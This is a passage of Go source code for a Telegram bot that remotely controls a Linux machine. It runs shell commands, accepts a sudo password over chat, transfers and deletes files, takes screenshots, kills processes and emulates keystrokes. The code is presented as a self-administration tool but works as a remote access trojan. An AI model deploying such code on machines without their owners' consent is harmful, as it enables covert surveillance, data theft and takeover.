//go:build linux
// +build linux

package main

import (
	"archive/zip"
	"context"
	_ "embed"
	"fmt"
	"image/png"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"syscall"
	"time"

	"github.com/faiface/beep"
	"github.com/faiface/beep/mp3"
	"github.com/faiface/beep/speaker"
	"github.com/faiface/beep/wav"
	"github.com/kbinani/screenshot"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/process"
)

var sudoPassword string

const (
	BOT_TOKEN = "TOKEN"
	ADMIN_CHAT_ID = 0000000000
	LOG_FILE_NAME = "app.log"
	MAX_LOG_SIZE  = 3 * 1024 * 1024
	VERSION       = "for EN-OS v3.0"
	maxFileSize   = 20 * 1024 * 1024
	chunkSize     = 20 * 1024 * 1024
)

var (
	bot                *tgbotapi.BotAPI
	logFile            *os.File
	currentDir         string
	currentLanguage    = "ru"
	audioStreamer      beep.StreamSeekCloser
	audioControl       *beep.Ctrl
	audioFormat        beep.Format
	waitingForCD       = false
	waitingForUpload   = false
	waitingForMkdir    = false
	waitingForRm       = false
	waitingForShell    = false
	waitingForKill     = false
	waitingForDownload = false
	waitingForHotkey   = false
	waitingForNotify   = false
	waitingForVolume   = false
)

var translations = map[string]map[string]string{
	"ru": {
		"welcome": "🎉 Добро пожаловать в Remote Assistant v%s!\n\n" +
		"Это упрощенный бот для удаленного управления Linux системой.\n" +
		"Инструкции: Используйте команды ниже. Если команда требует аргумента и он не указан, бот попросит ввести его в следующем сообщении.\n\n" +
		"✨ <b>Доступные команды:</b>\n" +
		"🔍 /info - Информация о системе\n" +
		"📊 /logs - Получить логи\n" +
		"💻 /shell - Выполнить команду\n" +
		"🔐 /sudo_pass - Установить пароль для sudo\n" +
		"🧹 /clear_sudo - Очистить пароль sudo\n" +
		"📋 /ps - Запущенные процессы\n" +
		"❌ /kill - Завершить процессы\n" +
		"📥 /download - Скачать файл\n" +
		"📤 /upload - Загрузить файл\n" +
		"📁 /cd - Сменить директорию\n" +
		"↩️ /cd_parent - На уровень выше\n" +
		"📂 /pwd - Содержимое директории\n" +
		"📸 /screenshot - Скриншот\n" +
		"🎵 /play - Воспроизвести аудио\n" +
		"⏸️ /pause_audio - Пауза аудио\n" +
		"▶️ /resume_audio - Возобновить аудио\n" +
		"⏹️ /stop_audio - Остановить аудио\n" +
		"⌨️ /hotkey - Эмуляция клавиш (расширенная)\n" +
		"🌍 /language - Сменить язык\n" +
		"🔁 /reboot - Перезагрузка системы\n" +
		"⏹️ /shutdown - Выключение системы\n" +
		"🔔 /notify - Показать уведомление\n" +
		"🔊 /volume - Управление громкостью\n" +
		"📁 /mkdir - Создать директорию\n" +
		"🗑️ /rm - Удалить файл/директорию\n" +
		"🔒 /lock - Заблокировать экран\n" +
		"❓ /help - Показать это сообщение\n\n" +
		"💝 Разработчик: https://github.com/Endscape-Coding",
		"unauthorized":       "🚫 Доступ запрещен",
		"unknown_command":    "❌ Неизвестная команда. Используйте /help для списка.",
		"system_info":        "🖥️ *Системная Информация*\n" +
		"💻 Имя ПК: `%s`\n" +
		"👤 Пользователь: `%s`\n" +
		"🌐 IP: `%s`\n" +
		"🐧 ОС: `%s`\n" +
		"⚙️ Ядро: `%s`\n" +
		"🚀 Версия: `%s`\n" +
		"🔐 Права sudo: `%v`\n" +
		"📂 Текущая директория: `%s`\n" +
		"🧠 CPU: `%s` (%.1f%%)\n" +
		"🧮 RAM: %.1f/%.1f GB (%.1f%%)\n" +
		"💾 Диск: %.1f/%.1f GB (%.1f%%)",
		"file_saved":         "✅ Файл сохранен: %s",
		"audio_playing":      "🔊 Воспроизведение аудио...",
		"audio_played":       "✅ Воспроизведено: %s",
		"audio_error":        "❌ Ошибка аудио: %v",
		"audio_stopped":      "⏹️ Воспроизведение остановлено",
		"audio_paused":       "⏸️ Аудио на паузе",
		"audio_resumed":      "▶️ Аудио возобновлено",
		"no_audio":           "❌ Нет активного воспроизведения",
		"screenshot_sent":    "📸 Скриншот отправлен",
		"screenshot_error":   "❌ Ошибка скриншота: %v",
		"hotkey_sent":        "⌨️ Комбинация отправлена: %s",
		"hotkey_error":       "❌ Ошибка эмуляции: %v",
		"language_changed":   "🌍 Язык изменен на: %s",
		"shell_usage":        "💻 Введите команду для выполнения:",
		"kill_usage":         "❌ Введите имя процесса для завершения:",
		"download_usage":     "📥 Введите путь к файлу для скачивания:",
		"upload_usage":       "📤 Введите путь для загрузки файла (или оставьте пустым для текущей директории):",
		"cd_usage":           "📁 Введите путь для смены директории:",
		"cd_success":         "📂 Перешел в: `%s`",
		"cd_error":           "❌ Ошибка: %s",
		"pwd_content":        "📂 `%s`\n\n%s",
		"reboot_confirm":     "🔁 Подтвердите перезагрузку: /reboot confirm",
		"shutdown_confirm":   "⏹️ Подтвердите выключение: /shutdown confirm",
		"notify_usage":       "🔔 Введите текст уведомления:",
		"notify_sent":        "🔔 Уведомление отправлено: %s",
		"notify_error":       "❌ Ошибка уведомления: %v",
		"volume_usage":       "🔊 Введите действие (up/down/set %%):",
		"volume_set":         "🔊 Громкость установлена на %s%%",
		"volume_error":       "❌ Ошибка громкости: %v",
		"mkdir_usage":        "📁 Введите имя новой директории:",
		"mkdir_success":      "✅ Директория создана: %s",
		"mkdir_error":        "❌ Ошибка создания: %v",
		"rm_usage":           "🗑️ Введите путь для удаления:",
		"rm_success":         "✅ Удалено: %s",
		"rm_error":           "❌ Ошибка удаления: %v",
		"lock_success":       "🔒 Экран заблокирован",
		"lock_error":         "❌ Ошибка блокировки: %v",
		"hotkey_usage":       "⌨️ Введите комбинацию клавиш (например: ctrl+alt+t, или предопределенные: vol_up, vol_down, mute):",
		"sudo_pass_usage":    "🔐 Введите пароль для sudo:",
	},
	"en": {
		"welcome": "🎉 Welcome to Remote Assistant v%s!\n\n" +
		"This is a simplified bot for remote Linux control.\n" +
		"Instructions: Use commands below. If a command requires an argument and it's not provided, the bot will ask for it in the next message.\n\n" +
		"✨ <b>Available commands:</b>\n" +
		"🔍 /info - System information\n" +
		"📊 /logs - Get logs\n" +
		"💻 /shell - Execute command\n" +
		"🔐 /sudo_pass - Set sudo password\n" +
		"🧹 /clear_sudo - Clear sudo password\n" +
		"📋 /ps - Running processes\n" +
		"❌ /kill - Kill processes\n" +
		"📥 /download - Download file\n" +
		"📤 /upload - Upload file\n" +
		"📁 /cd - Change directory\n" +
		"↩️ /cd_parent - Go up\n" +
		"📂 /pwd - Directory contents\n" +
		"📸 /screenshot - Screenshot\n" +
		"🎵 /play - Play audio\n" +
		"⏸️ /pause_audio - Pause audio\n" +
		"▶️ /resume_audio - Resume audio\n" +
		"⏹️ /stop_audio - Stop audio\n" +
		"⌨️ /hotkey - Emulate keys (extended)\n" +
		"🌍 /language - Change language\n" +
		"🔁 /reboot - Reboot system\n" +
		"⏹️ /shutdown - Shutdown system\n" +
		"🔔 /notify - Show notification\n" +
		"🔊 /volume - Volume control\n" +
		"📁 /mkdir - Create directory\n" +
		"🗑️ /rm - Remove file/dir\n" +
		"🔒 /lock - Lock screen\n" +
		"❓ /help - Show this message\n\n" +
		"💝 Developer: https://github.com/Endscape-Coding",
		"unauthorized":       "🚫 Access denied",
		"unknown_command":    "❌ Unknown command. Use /help for list.",
		"system_info":        "🖥️ *System Information*\n" +
		"💻 PC Name: `%s`\n" +
		"👤 User: `%s`\n" +
		"🌐 IP: `%s`\n" +
		"🐧 OS: `%s`\n" +
		"⚙️ Kernel: `%s`\n" +
		"🚀 Version: `%s`\n" +
		"🔐 Sudo rights: `%v`\n" +
		"📂 Current directory: `%s`\n" +
		"🧠 CPU: `%s` (%.1f%%)\n" +
		"🧮 RAM: %.1f/%.1f GB (%.1f%%)\n" +
		"💾 Disk: %.1f/%.1f GB (%.1f%%)",
		"file_saved":         "✅ File saved: %s",
		"audio_playing":      "🔊 Playing audio...",
		"audio_played":       "✅ Played: %s",
		"audio_error":        "❌ Audio error: %v",
		"audio_stopped":      "⏹️ Playback stopped",
		"audio_paused":       "⏸️ Audio paused",
		"audio_resumed":      "▶️ Audio resumed",
		"no_audio":           "❌ No active playback",
		"screenshot_sent":    "📸 Screenshot sent",
		"screenshot_error":   "❌ Screenshot error: %v",
		"hotkey_sent":        "⌨️ Combination sent: %s",
		"hotkey_error":       "❌ Emulation error: %v",
		"language_changed":   "🌍 Language changed to: %s",
		"shell_usage":        "💻 Enter command to execute:",
		"kill_usage":         "❌ Enter process name to kill:",
		"download_usage":     "📥 Enter file path to download:",
		"upload_usage":       "📤 Enter path to upload file (or leave empty for current dir):",
		"cd_usage":           "📁 Enter path to change directory:",
		"cd_success":         "📂 Changed to: `%s`",
		"cd_error":           "❌ Error: %s",
		"pwd_content":        "📂 `%s`\n\n%s",
		"reboot_confirm":     "🔁 Confirm reboot: /reboot confirm",
		"shutdown_confirm":   "⏹️ Confirm shutdown: /shutdown confirm",
		"notify_usage":       "🔔 Enter notification text:",
		"notify_sent":        "🔔 Notification sent: %s",
		"notify_error":       "❌ Notification error: %v",
		"volume_usage":       "🔊 Enter action (up/down/set %%):",
		"volume_set":         "🔊 Volume set to %s%%",
		"volume_error":       "❌ Volume error: %v",
		"mkdir_usage":        "📁 Enter new directory name:",
		"mkdir_success":      "✅ Directory created: %s",
		"mkdir_error":        "❌ Create error: %v",
		"rm_usage":           "🗑️ Enter path to remove:",
		"rm_success":         "✅ Removed: %s",
		"rm_error":           "❌ Remove error: %v",
		"lock_success":       "🔒 Screen locked",
		"lock_error":         "❌ Lock error: %v",
		"hotkey_usage":       "⌨️ Enter key combination (e.g.: ctrl+alt+t, or predefined: vol_up, vol_down, mute):",
		"sudo_pass_usage":    "🔐 Enter sudo password:",
	},
}

func tr(key string) string {
	if lang, ok := translations[currentLanguage]; ok {
		if val, ok := lang[key]; ok {
			return val
		}
	}
	return key
}

func init() {
	var err error
	currentDir, err = os.Getwd()
	if err != nil {
		log.Printf("Error getting current dir: %v", err)
		currentDir = "/"
	}
}

func initLogging() error {
	logPath := filepath.Join(os.TempDir(), LOG_FILE_NAME)

	if info, err := os.Stat(logPath); err == nil && info.Size() > MAX_LOG_SIZE {
		os.Remove(logPath + ".old")
		os.Rename(logPath, logPath+".old")
	}

	var err error
	logFile, err = os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return fmt.Errorf("failed to create log file: %v", err)
	}

	log.SetOutput(io.MultiWriter(logFile, os.Stdout))
	log.Printf("=== Starting Linux v%s ===\n", VERSION)
	return nil
}

func isAdmin() bool {
	return os.Geteuid() == 0
}

func getSystemInfo() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	ip := getLocalIP()

	out, _ := exec.Command("uname", "-a").CombinedOutput()
	kernel := strings.TrimSpace(string(out))

	osInfo := runtime.GOOS + " " + runtime.GOARCH

	cpuInfo, _ := cpu.Info()
	cpuPercent, _ := cpu.Percent(0, false)
	cpuName := "Unknown"
	cpuUsage := 0.0
	if len(cpuInfo) > 0 {
		cpuName = cpuInfo[0].ModelName
	}
	if len(cpuPercent) > 0 {
		cpuUsage = cpuPercent[0]
	}

	memInfo, _ := mem.VirtualMemory()
	ramUsed := float64(memInfo.Used) / 1024 / 1024 / 1024
	ramTotal := float64(memInfo.Total) / 1024 / 1024 / 1024
	ramPercent := memInfo.UsedPercent

	diskInfo, _ := disk.Usage("/")
	diskUsed := float64(diskInfo.Used) / 1024 / 1024 / 1024
	diskTotal := float64(diskInfo.Total) / 1024 / 1024 / 1024
	diskPercent := diskInfo.UsedPercent

	return fmt.Sprintf(tr("system_info"),
			   escapeMarkdownV2(hostname), escapeMarkdownV2(username), escapeMarkdownV2(ip), escapeMarkdownV2(osInfo), escapeMarkdownV2(kernel),
			   escapeMarkdownV2(VERSION), isAdmin(), escapeMarkdownV2(currentDir),
			   escapeMarkdownV2(cpuName), cpuUsage,
			   ramUsed, ramTotal, ramPercent,
		    diskUsed, diskTotal, diskPercent,
	)
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "Unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "Unknown"
}

func initBot() error {
	var err error
	bot, err = tgbotapi.NewBotAPI(BOT_TOKEN)
	if err != nil {
		return fmt.Errorf("bot init failed: %v", err)
	}

	bot.Debug = false
	log.Printf("Authorized on account %s", bot.Self.UserName)
	sendMarkdownSafe(ADMIN_CHAT_ID, "🚀 Bot started successfully!\n"+getSystemInfo())
	sendScreenshot(ADMIN_CHAT_ID)

	return nil
}

func sendMarkdownSafe(chatID int64, text string) {
	safe := escapeMarkdownV2(text)
	msg := tgbotapi.NewMessage(chatID, safe)
	msg.ParseMode = tgbotapi.ModeMarkdownV2
	if _, err := bot.Send(msg); err != nil {
		fallback := tgbotapi.NewMessage(chatID, text)
		bot.Send(fallback)
		log.Printf("Markdown failed, sent plain: %v", err)
	}
}

func createKeyboard() tgbotapi.ReplyKeyboardMarkup {
	return tgbotapi.NewReplyKeyboard(
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/start"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/help"), tgbotapi.NewKeyboardButton("/info"), tgbotapi.NewKeyboardButton("/logs"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/shell"), tgbotapi.NewKeyboardButton("/ps"), tgbotapi.NewKeyboardButton("/kill"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/download"), tgbotapi.NewKeyboardButton("/upload"), tgbotapi.NewKeyboardButton("/cd"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/cd_parent"), tgbotapi.NewKeyboardButton("/pwd"), tgbotapi.NewKeyboardButton("/mkdir"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/rm"), tgbotapi.NewKeyboardButton("/screenshot"), tgbotapi.NewKeyboardButton("/hotkey"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/play"), tgbotapi.NewKeyboardButton("/pause_audio"), tgbotapi.NewKeyboardButton("/resume_audio"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/stop_audio"), tgbotapi.NewKeyboardButton("/volume"), tgbotapi.NewKeyboardButton("/notify"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/lock"), tgbotapi.NewKeyboardButton("/reboot"), tgbotapi.NewKeyboardButton("/shutdown"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/sudo_pass"), tgbotapi.NewKeyboardButton("/clear_sudo"), tgbotapi.NewKeyboardButton("/language"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/uptime"), tgbotapi.NewKeyboardButton("/who"), tgbotapi.NewKeyboardButton("/top"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/disks"), tgbotapi.NewKeyboardButton("/memory"), tgbotapi.NewKeyboardButton("/authlog"),
		),
		tgbotapi.NewKeyboardButtonRow(
			tgbotapi.NewKeyboardButton("/sessions"),
		),
	)
}

func handleBotCommands() {
	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 60
	updates := bot.GetUpdatesChan(updateConfig)

	keyboard := createKeyboard()

	for update := range updates {
		if update.Message == nil {
			continue
		}

		chatID := update.Message.Chat.ID
		if chatID != ADMIN_CHAT_ID {
			sendMessage(chatID, tr("unauthorized"))
			continue
		}

		msg := tgbotapi.NewMessage(chatID, "")
		msg.ReplyMarkup = keyboard

		text := update.Message.Text

		if update.Message.Audio != nil || update.Message.Voice != nil ||
			(update.Message.Document != nil && isAudioFile(update.Message.Document.FileName)) {
				handleAudioUpload(update)
				continue
			}

			if update.Message.Document != nil {
				if waitingForUpload {
					handleFileUpload(update, currentDir)
					waitingForUpload = false
				} else {
					handleFileUpload(update, currentDir)
				}
				continue
			}

			if update.Message.Photo != nil || (update.Message.Document != nil && isImageFile(update.Message.Document.FileName)) {
				handleWallpaperUpload(update)
				continue
			}

			if !update.Message.IsCommand() {
				if waitingForCD {
					result, err := changeDirectory(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("cd_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("cd_success"), result))
					}
					waitingForCD = false
				} else if waitingForShell {
					sendMessage(chatID, executeCommand(text))
					waitingForShell = false
				} else if waitingForKill {
					sendMessage(chatID, KillProcessByName(text))
					waitingForKill = false
				} else if waitingForDownload {
					sendFile(chatID, text)
					waitingForDownload = false
				} else if waitingForHotkey {
					err := emulateHotkey(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("hotkey_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("hotkey_sent"), text))
					}
					waitingForHotkey = false
				} else if waitingForNotify {
					err := showNotification(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("notify_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("notify_sent"), text))
					}
					waitingForNotify = false
				} else if waitingForVolume {
					err := controlVolume(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("volume_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("volume_set"), text))
					}
					waitingForVolume = false
				} else if waitingForMkdir {
					err := createDirectory(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("mkdir_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("mkdir_success"), text))
					}
					waitingForMkdir = false
				} else if waitingForRm {
					err := removePath(text)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("rm_error"), err))
					} else {
						sendMessage(chatID, fmt.Sprintf(tr("rm_success"), text))
					}
					waitingForRm = false
				} else {
					sendMessage(chatID, tr("unknown_command"))
				}
				continue
			}

			command := update.Message.Command()
			args := strings.TrimSpace(update.Message.CommandArguments())

			switch command {
				case "start", "help":
					msg.Text = fmt.Sprintf(tr("welcome"), VERSION)
					msg.ParseMode = tgbotapi.ModeHTML
					bot.Send(msg)

				case "info":
					msg.Text = getSystemInfo()
					msg.ParseMode = tgbotapi.ModeMarkdownV2
					bot.Send(msg)

				case "logs":
					sendLogFile(chatID)

				case "shell":
					if args == "" {
						sendMessage(chatID, tr("shell_usage"))
						waitingForShell = true
					} else {
						sendMessage(chatID, executeCommand(args))
					}

				case "sudo_pass":
					if args == "" {
						sendMessage(chatID, tr("sudo_pass_usage"))
					} else {
						sudoPassword = args
						sendMessage(chatID, "✅ Sudo password set")
						time.AfterFunc(5*time.Minute, func() {
							sudoPassword = ""
							log.Println("Sudo password cleared")
						})
					}

				case "clear_sudo":
					sudoPassword = ""
					sendMessage(chatID, "✅ Sudo password cleared")

				case "ps":
					messages := ListProcesses()
					for _, msgText := range messages {
						sendMarkdownMessage(chatID, msgText)
					}

				case "kill":
					if args == "" {
						sendMessage(chatID, tr("kill_usage"))
						waitingForKill = true
					} else {
						sendMessage(chatID, KillProcessByName(args))
					}

				case "download":
					if args == "" {
						sendMessage(chatID, tr("download_usage"))
						waitingForDownload = true
					} else {
						sendFile(chatID, args)
					}

				case "upload":
					if args != "" {
						currentDir = args
					}
					sendMessage(chatID, tr("upload_usage"))
					waitingForUpload = true

				case "cd":
					if args == "" {
						sendMessage(chatID, tr("cd_usage"))
						waitingForCD = true
					} else {
						result, err := changeDirectory(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("cd_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("cd_success"), result))
						}
					}

				case "cd_parent":
					result, err := changeToParentDirectory()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("cd_error"), err))
					} else {
						sendMessage(chatID, result)
					}

				case "pwd":
					contents, err := getCurrentDirContents()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("cd_error"), err))
					} else {
						sendMarkdownMessage(chatID, contents)
					}

				case "screenshot":
					err := sendScreenshot(chatID)
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("screenshot_error"), err))
					} else {
						sendMessage(chatID, tr("screenshot_sent"))
					}

				case "play":
					if update.Message.ReplyToMessage != nil && (update.Message.ReplyToMessage.Audio != nil || update.Message.ReplyToMessage.Voice != nil || (update.Message.ReplyToMessage.Document != nil && isAudioFile(update.Message.ReplyToMessage.Document.FileName))) {
						handleAudioUpload(tgbotapi.Update{Message: update.Message.ReplyToMessage})
					} else {
						sendMessage(chatID, "🎵 Reply to an audio message with /play")
					}

				case "pause_audio":
					if audioControl != nil {
						audioControl.Paused = true
						sendMessage(chatID, tr("audio_paused"))
					} else {
						sendMessage(chatID, tr("no_audio"))
					}

				case "resume_audio":
					if audioControl != nil {
						audioControl.Paused = false
						sendMessage(chatID, tr("audio_resumed"))
					} else {
						sendMessage(chatID, tr("no_audio"))
					}

				case "stop_audio":
					if audioControl != nil {
						speaker.Clear()
						audioStreamer.Close()
						audioControl = nil
						sendMessage(chatID, tr("audio_stopped"))
					} else {
						sendMessage(chatID, tr("no_audio"))
					}

				case "hotkey":
					if args == "" {
						sendMessage(chatID, tr("hotkey_usage"))
						waitingForHotkey = true
					} else {
						err := emulateHotkey(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("hotkey_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("hotkey_sent"), args))
						}
					}

				case "language":
					if currentLanguage == "ru" {
						currentLanguage = "en"
					} else {
						currentLanguage = "ru"
					}
					sendMessage(chatID, fmt.Sprintf(tr("language_changed"), currentLanguage))

				case "reboot":
					if args == "confirm" {
						exec.Command("reboot").Run()
					} else {
						sendMessage(chatID, tr("reboot_confirm"))
					}

				case "shutdown":
					if args == "confirm" {
						exec.Command("shutdown", "now").Run()
					} else {
						sendMessage(chatID, tr("shutdown_confirm"))
					}

				case "notify":
					if args == "" {
						sendMessage(chatID, tr("notify_usage"))
						waitingForNotify = true
					} else {
						err := showNotification(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("notify_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("notify_sent"), args))
						}
					}

				case "volume":
					if args == "" {
						sendMessage(chatID, tr("volume_usage"))
						waitingForVolume = true
					} else {
						err := controlVolume(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("volume_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("volume_set"), args))
						}
					}

				case "mkdir":
					if args == "" {
						sendMessage(chatID, tr("mkdir_usage"))
						waitingForMkdir = true
					} else {
						err := createDirectory(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("mkdir_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("mkdir_success"), args))
						}
					}

				case "rm":
					if args == "" {
						sendMessage(chatID, tr("rm_usage"))
						waitingForRm = true
					} else {
						err := removePath(args)
						if err != nil {
							sendMessage(chatID, fmt.Sprintf(tr("rm_error"), err))
						} else {
							sendMessage(chatID, fmt.Sprintf(tr("rm_success"), args))
						}
					}

				case "lock":
					err := lockScreen()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf(tr("lock_error"), err))
					} else {
						sendMessage(chatID, tr("lock_success"))
					}

				case "uptime":
					out, err := exec.Command("uptime").Output()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else {
						sendMarkdownMessage(chatID, "```text\n"+string(out)+"```")
					}

				case "who":
					out, err := exec.Command("who").Output()
					if err != nil || len(out) == 0 {
						out, err = exec.Command("w").Output()
					}
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else if len(out) == 0 {
						sendMessage(chatID, "No users logged in")
					} else {
						sendMarkdownMessage(chatID, "```text\n"+string(out)+"```")
					}

				case "top":
					messages := ListTopProcesses(10)
					for _, msgText := range messages {
						sendMarkdownMessage(chatID, msgText)
					}

				case "disks":
					out, err := exec.Command("df", "-h").Output()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else {
						sendMarkdownMessage(chatID, "```text\n"+string(out)+"```")
					}

				case "memory":
					out, err := exec.Command("free", "-h").Output()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else {
						sendMarkdownMessage(chatID, "```text\n"+string(out)+"```")
					}

				case "authlog":
					out, err := exec.Command("last").Output()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else {
						sendMarkdownMessage(chatID, "```text\n"+string(out)+"```")
					}

				case "sessions":
					out, err := exec.Command("loginctl", "list-sessions").Output()
					if err != nil {
						sendMessage(chatID, fmt.Sprintf("Error: %v", err))
					} else {
						lines := strings.Split(string(out), "\n")
						var waylandSessions []string
						for _, line := range lines {
							if strings.Contains(line, "wayland") {
								waylandSessions = append(waylandSessions, line)
							}
						}
						if len(waylandSessions) == 0 {
							sendMessage(chatID, "No Wayland sessions found or only one authorization in Wayland history.")
						} else {
							sendMarkdownMessage(chatID, "```text\n"+strings.Join(waylandSessions, "\n")+"```")
						}
					}

				default:
					sendMessage(chatID, tr("unknown_command"))
			}
	}
}

func escapeMarkdownV2(s string) string {
	special := []rune{'_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'}
	var builder strings.Builder
	for _, r := range s {
		if containsRune(special, r) {
			builder.WriteRune('\\')
		}
		builder.WriteRune(r)
	}
	return builder.String()
}

func containsRune(slice []rune, r rune) bool {
	for _, s := range slice {
		if s == r {
			return true
		}
	}
	return false
}

func sendMarkdownMessage(chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = tgbotapi.ModeMarkdownV2
	bot.Send(msg)
}

func lockScreen() error {
	if err := exec.Command("gnome-screensaver-command", "-l").Run(); err == nil {
		return nil
	}
	if err := exec.Command("xdg-screensaver", "lock").Run(); err == nil {
		return nil
	}
	return fmt.Errorf("no supported lock command found")
}

func showNotification(text string) error {
	return exec.Command("notify-send", text).Run()
}

func controlVolume(action string) error {
	parts := strings.Split(action, " ")
	cmd := "amixer"
	args := []string{"set", "Master"}
	switch parts[0] {
		case "up":
			args = append(args, "5%+")
		case "down":
			args = append(args, "5%-")
		case "set":
			if len(parts) > 1 {
				args = append(args, parts[1]+"%")
			} else {
				return fmt.Errorf("no volume level")
			}
		default:
			return fmt.Errorf("invalid action")
	}
	return exec.Command(cmd, args...).Run()
}

func createDirectory(name string) error {
	path := filepath.Join(currentDir, name)
	return os.MkdirAll(path, 0755)
}

func removePath(path string) error {
	fullPath := path
	if !filepath.IsAbs(path) {
		fullPath = filepath.Join(currentDir, path)
	}
	return os.RemoveAll(fullPath)
}

func emulateHotkey(keys string) error {
	keyMap := map[string]string{
		"ctrl":      "Control",
		"alt":       "Alt",
		"shift":     "Shift",
		"win":       "Super",
		"enter":     "Return",
		"tab":       "Tab",
		"esc":       "Escape",
		"space":     "space",
		"backspace": "BackSpace",
		"delete":    "Delete",
		"up":        "Up",
		"down":      "Down",
		"left":      "Left",
		"right":     "Right",
		"f1":        "F1",
		"f2":        "F2",
		"f3":	     "F3",
		"f4":        "F4",
		"f5":        "F5",
		"f6":        "F6",
		"f7":        "F7",
		"f8":        "F8",
		"f9":        "F9",
		"f10":       "F10",
		"f11":       "F11",
		"f12":       "F12",
		"vol_up":    "XF86AudioRaiseVolume",
		"vol_down":  "XF86AudioLowerVolume",
		"mute":      "XF86AudioMute",
		"play_pause": "XF86AudioPlay",
		"next":      "XF86AudioNext",
		"prev":      "XF86AudioPrev",
	}

	parts := strings.Split(strings.ToLower(keys), "+")
	var xdoParts []string

	for _, part := range parts {
		if mapped, ok := keyMap[part]; ok {
			xdoParts = append(xdoParts, mapped)
		} else {
			xdoParts = append(xdoParts, part)
		}
	}

	cmd := exec.Command("xdotool", "key", strings.Join(xdoParts, "+"))
	return cmd.Run()
}

func isImageFile(filename string) bool {
	ext := strings.ToLower(filepath.Ext(filename))
	return ext == ".jpg" || ext == ".jpeg" || ext == ".png" || ext == ".bmp"
}

func handleWallpaperUpload(update tgbotapi.Update) {
	var fileID, fileName string

	if update.Message.Photo != nil {
		photo := update.Message.Photo[len(update.Message.Photo)-1]
		fileID = photo.FileID
		fileName = "wallpaper.jpg"
	} else if update.Message.Document != nil {
		fileID = update.Message.Document.FileID
		fileName = update.Message.Document.FileName
	}

	file, err := bot.GetFile(tgbotapi.FileConfig{FileID: fileID})
	if err != nil {
		sendMessage(update.Message.Chat.ID, "❌ Error getting image")
		return
	}

	tempDir := filepath.Join(os.TempDir(), "telegram_wallpapers")
	os.MkdirAll(tempDir, 0755)

	filePath := filepath.Join(tempDir, fileName)
	downloadFile(file.Link(bot.Token), filePath)

	err = setWallpaper(filePath)
	if err != nil {
		sendMessage(update.Message.Chat.ID, "❌ Error setting wallpaper: "+err.Error())
		return
	}

	sendMessage(update.Message.Chat.ID, "✅ Wallpaper set")
}

func setWallpaper(imagePath string) error {
	desktopEnv := os.Getenv("XDG_CURRENT_DESKTOP")
	switch {
		case strings.Contains(strings.ToUpper(desktopEnv), "GNOME"):
			return exec.Command("gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://"+imagePath).Run()
		case strings.Contains(strings.ToUpper(desktopEnv), "KDE"):
